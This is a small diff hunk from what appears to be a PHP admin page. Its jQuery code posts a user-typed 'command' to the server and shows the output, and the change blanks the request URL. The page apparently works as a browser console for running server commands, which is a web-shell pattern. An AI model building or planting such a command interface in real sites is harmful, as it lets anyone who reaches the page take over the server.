@@ -48,7 +48,7 @@ if(isset($_POST["command"])){
                 var command = $('#command').val(); // Get command value
                 $.ajax({
                     type: 'POST',
-                    url: '/SPPT/admin',
+                    url: '',
                     data: { command: command },
                     success: function (response) {
                         $('#output').html('<pre>' + response + '</pre>'); // Display output
